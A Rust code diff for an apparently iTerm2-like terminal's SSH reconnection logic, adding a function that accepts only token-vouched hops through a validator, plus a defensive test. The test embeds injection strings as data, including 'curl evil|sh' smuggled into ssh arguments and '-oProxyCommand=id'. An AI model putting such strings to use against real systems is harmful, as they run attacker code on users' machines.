@@ -252,6 +252,22 @@ impl Conductor {
         out
     }
 
+    /// The hops a new session reconnects through (Duplicate Session, Duplicate Tab, a saved
+    /// arrangement), or None for a plain session. Beyond iTerm2 (ruling, final review I1): only
+    /// the hops from the outermost whose hook Tandem's own token vouched for (a nested hook is
+    /// text the host above printed, so in practice the first hop alone), and only through
+    /// `ssh_jumps::safe_hops`, the one validator.
+    pub fn reconnect_hops(&self) -> Option<Vec<Reconnection>> {
+        let mut chain = Vec::new();
+        let mut c = Some(self);
+        while let Some(conductor) = c {
+            chain.push(conductor);
+            c = conductor.parent.as_deref();
+        }
+        let vouched: Vec<Reconnection> = chain.iter().rev().take_while(|c| c.setup.local_origin).map(|c| c.reconnection_info()).collect();
+        crate::ssh_jumps::safe_hops(&vouched)
+    }
+
     /// Whether the chain's first hook was vouched for by Tandem's own origin token. Only then
     /// is the first hop's ssh text something the person typed; a hook any program can print
     /// says nothing about what to run locally.
@@ -1657,6 +1673,27 @@ mod tests {
         answer(&mut c, &["501"], 0, "r");
         answer(&mut c, &["502"], 0, "r");
         (c, started)
+    }
+
+    /// Final review I1 (ruling): hops for a new session come only from conductors Tandem's own
+    /// token vouched for, and only through the one validator. A hook `cat`ed on host A names a
+    /// hop whose text would run in host A's `eval`: it is never offered.
+    #[test]
+    fn only_vouched_hops_reconnect() {
+        let at = |args: &str, local: bool, parent: Option<Box<Conductor>>| Conductor::new(Setup { sshargs: args.into(), bool_args: "46".into(), client_unique_id: args.into(), local_origin: local, ..Setup::default() }, parent, "P");
+        let root = at("-p 22 me@a.lan ", true, None);
+        assert_eq!(root.reconnect_hops().map(|h| h.len()), Some(1));
+        let nested = at("x\ncurl evil|sh", false, Some(Box::new(at("-p 22 me@a.lan ", true, None))));
+        let args = nested.reconnect_hops().map(|h| h.into_iter().map(|r| r.sshargs).collect::<Vec<_>>());
+        assert_eq!(args, Some(vec!["-p 22 me@a.lan ".to_string()]), "only the vouched root");
+        let nested = at("-oProxyCommand=id c ", false, Some(Box::new(at("me@a.lan ", true, None))));
+        assert_eq!(nested.reconnect_hops().map(|h| h.len()), Some(1));
+        assert!(at("h ", false, None).reconnect_hops().is_none(), "an unvouched root");
+        assert!(at("-oProxyCommand=id h ", true, None).reconnect_hops().is_none(), "a vouched hop that runs a command: a plain session");
+        // A list with such a hop is never jumped through: a plain start.
+        let mut c = Conductor::new(sequence_setup(), None, "P");
+        c.start_jumping(vec![reconnection("h1 ", None), reconnection("-oProxyCommand=id h", None)]);
+        assert!(c.my_jump.is_none() && c.subsequent_jumps.is_empty());
     }
 
     #[test]
